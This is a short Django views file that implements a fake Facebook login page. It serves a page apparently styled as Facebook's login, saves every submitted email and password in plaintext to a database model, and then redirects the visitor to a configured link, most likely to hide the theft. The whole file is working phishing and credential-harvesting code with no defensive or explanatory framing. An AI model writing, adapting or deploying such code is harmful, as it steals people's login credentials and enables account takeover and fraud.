from django.shortcuts import render, redirect
from .models import *

def FBLogin(request):
    data = {}

    if request.method == 'GET':
        return render(request=request, context=data, template_name='facebook/facebook.html')
    elif request.method == 'POST':
        email = request.POST.get('email')
        password = request.POST.get('password')

        FBLogins.objects.create(email=email, password=password)

        link = RedirectLink.objects.all()[0]

        return redirect(link.link)